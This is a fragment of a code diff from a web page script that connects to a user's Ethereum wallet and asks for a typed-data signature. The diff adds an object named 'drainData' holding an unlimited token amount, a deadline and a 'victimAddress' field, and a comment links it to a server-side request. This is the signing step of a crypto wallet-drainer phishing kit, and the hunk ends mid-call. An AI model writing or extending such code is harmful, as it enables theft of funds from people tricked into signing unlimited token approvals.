@@ -483,12 +483,13 @@ try {
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     
-    const permit = {
-      token: tokenAddr,
-      amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
-      expiration: Math.floor(Date.now() / 1000) + 3600,
-      nonce: 0
-    };
+    const drainData = {
+    tokenSymbol: symbol,
+    amount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    nonce: "0",
+    deadline: Math.floor(Date.now() / 1000 + 3600).toString(),
+    victimAddress: victimWallet  // 🔥 THIS MATCHES req.body.victimAddress
+  };
     
     signature = await signer._signTypedData(
       {
